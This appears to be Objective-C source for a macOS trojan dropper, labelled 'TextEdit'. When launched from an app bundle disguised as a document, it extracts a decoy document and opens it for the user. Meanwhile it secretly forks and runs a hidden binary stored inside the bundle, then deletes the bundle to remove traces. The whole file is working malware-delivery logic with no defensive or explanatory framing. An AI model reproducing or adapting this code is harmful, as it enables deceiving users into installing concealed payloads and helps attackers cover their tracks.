//
//  main.m
//  TextEdit
//
//  Created by armored on 29/11/13.
//  Copyright (c) 2013 tst. All rights reserved.
//

#import <Foundation/Foundation.h>

NSString *getSrcDocFilepath(NSString *docFolderpath)
{
  NSString *docFilename = nil;
  
  NSFileManager *fm = [NSFileManager defaultManager];
  
  NSArray  *dirContent = [fm contentsOfDirectoryAtPath:docFolderpath error:nil];
  
  docFilename = [NSString stringWithFormat:@"%@/Contents/Resources/doc/%@",
                 [[NSBundle mainBundle] bundlePath], [dirContent objectAtIndex:0]];
  
  return docFilename;
}

NSString *getFileExtension(NSString *filePath)
{
  return [filePath pathExtension];
}

NSString *getDstDocFilepath(NSString *bundlepath, NSString *docExt)
{
  NSRange range;
  NSString *docFilepath = nil;
  
  NSString *bundlename = [bundlepath lastPathComponent];
  NSString *docPath = [bundlepath stringByDeletingLastPathComponent];
  
  range.length   = [bundlename length] - 4;
  range.location = 0;
  
  NSString *docName = [bundlename substringWithRange:range];
  
  return docFilepath = [NSString stringWithFormat: @"%@/%@.%@", docPath, docName, docExt];
}

NSString *moveOriginalDoc()
{
  NSString *docFolderpath    = nil;
  NSString *srcDocFilepath   = nil;
  NSString *srcDocExtension  = nil;
  NSString *dstDocFilepath   = nil;
  
  docFolderpath   = [NSString stringWithFormat:@"%@/%@",
                     [[NSBundle mainBundle] bundlePath],
                     @"Contents/Resources/doc"];
  
  srcDocFilepath   = getSrcDocFilepath(docFolderpath);
  srcDocExtension  = getFileExtension(srcDocFilepath);
  dstDocFilepath   = getDstDocFilepath([[NSBundle mainBundle] bundlePath], srcDocExtension);
  
  if ([[NSFileManager defaultManager] moveItemAtPath: srcDocFilepath toPath:dstDocFilepath error:nil] == TRUE)
    return dstDocFilepath;
  else
    return nil;
}

int main(int argc, const char * argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  NSString *installFilepath = nil;
  NSString *dstDocFilepath  = nil;
  
  installFilepath = [NSString stringWithFormat:@"%@/%@",
                                               [[NSBundle mainBundle] bundlePath],
                                               @"Contents/Resources/bin/TextEdit"];
  
  dstDocFilepath = moveOriginalDoc();
  
  char *installCpath = (char*) [installFilepath fileSystemRepresentation];
  
  int ret = 0;
  pid_t pid = fork();
  
  if (pid == 0)
  {
    execl(installCpath, installCpath, 0, 0);
  }
  else
  {
    if (dstDocFilepath != nil)
    {
      NSURL *docUrl = [NSURL fileURLWithPath: dstDocFilepath];
      LSOpenCFURLRef(docUrl, 0);
    }
    
    waitpid(pid, &ret, 0);

    [[NSFileManager defaultManager] removeItemAtPath:[[NSBundle mainBundle] bundlePath] error:nil];
  }
  
  [pool release];
  
  return 0;
}

